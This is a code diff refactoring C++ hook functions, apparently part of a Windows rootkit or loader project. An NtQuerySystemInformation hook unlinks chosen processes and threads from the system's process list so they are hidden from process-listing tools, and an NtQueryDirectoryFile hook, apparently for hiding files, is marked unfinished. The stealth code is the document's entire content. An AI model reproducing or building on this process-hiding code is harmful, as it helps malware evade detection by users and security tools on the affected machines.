@@ -23,6 +23,8 @@ namespace hk {
 		return (void*)((ptr)pData + offset);
 	}
 
+	// BUG, TODO: Fix this and finalize the hook, it never hot continued
+	// - will probably finish this after being done with the main loader
 	nt::NtQueryDirectoryFile_t NtQueryDirectoryFile;
 	NTSTATUS NTAPI NtQueryDirectoryFileHook(
 		_In_                       handle          FileHandle,
@@ -82,10 +84,9 @@ namespace hk {
 
 #pragma region NtQuerySystemInformation
 	status UnlinkProcessEntry(
-		_In_ nt::SYSTEM_PROCESS_INFORMATION* spi
+		_In_ SYSTEM_PROCESS_INFORMATION* spi
 	) {
-		nt::SYSTEM_PROCESS_INFORMATION* NextEntry = (nt::SYSTEM_PROCESS_INFORMATION*)
-			((ptr)spi->NextEntryOffset + (ptr)spi);
+		auto NextEntry = (SYSTEM_PROCESS_INFORMATION*)((ptr)spi->NextEntryOffset + (ptr)spi);
 		if (NextEntry->NextEntryOffset)
 			spi->NextEntryOffset += NextEntry->NextEntryOffset;
 		else
@@ -94,10 +95,10 @@ namespace hk {
 		return spi->NextEntryOffset;
 	}
 	status UnlinkThreadEntry(
-		_In_ nt::SYSTEM_PROCESS_INFORMATION* spi,
-		_In_     u32                      TId
+		_In_ SYSTEM_PROCESS_INFORMATION* spi,
+		_In_ u32                         TId
 	) {
-		nt::SYSTEM_THREAD_INFORMATION* stit = (nt::SYSTEM_THREAD_INFORMATION*)(spi + 1);
+		auto stit = (SYSTEM_THREAD_INFORMATION*)(spi + 1);
 
 		for (u16 i = 0; i < spi->NumberOfThreads; i++)
 			if ((u32)stit[i].ClientId.UniqueThread == TId) {
@@ -119,12 +120,12 @@ namespace hk {
 		NTSTATUS s = NtQuerySystemInformation(SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength);
 
 		// Execute hook if SystemProcessInformation and atleast one Entry exists
-		if (SystemInformationClass == 0x05 && SystemInformationLength >= sizeof(nt::SYSTEM_PROCESS_INFORMATION)) {
+		if (SystemInformationClass == 0x05 && SystemInformationLength >= sizeof(SYSTEM_PROCESS_INFORMATION)) {
 			if (!g_ProcessList->GetItemCount())
 				return s; // No Items to Hide
 
 			// Setup first Process Entry
-			nt::SYSTEM_PROCESS_INFORMATION* PreviousEntry = (nt::SYSTEM_PROCESS_INFORMATION*)SystemInformation;
+			auto PreviousEntry = (SYSTEM_PROCESS_INFORMATION*)SystemInformation;
 			do {
 				if (!PreviousEntry->NextEntryOffset)
 					break;
@@ -133,9 +134,7 @@ namespace hk {
 
 			RedoNext:
 				// The current Entry in the List to be inspected
-				nt::SYSTEM_PROCESS_INFORMATION* CurrentEntry = (nt::SYSTEM_PROCESS_INFORMATION*)
-					((ptr)PreviousEntry->NextEntryOffset + (ptr)PreviousEntry);
-
+				auto CurrentEntry = (SYSTEM_PROCESS_INFORMATION*)((ptr)PreviousEntry->NextEntryOffset + (ptr)PreviousEntry);
 				void* Entry = g_ProcessList->GetFirstEntry();
 				do {
 					// Check if Data is a Process Entry
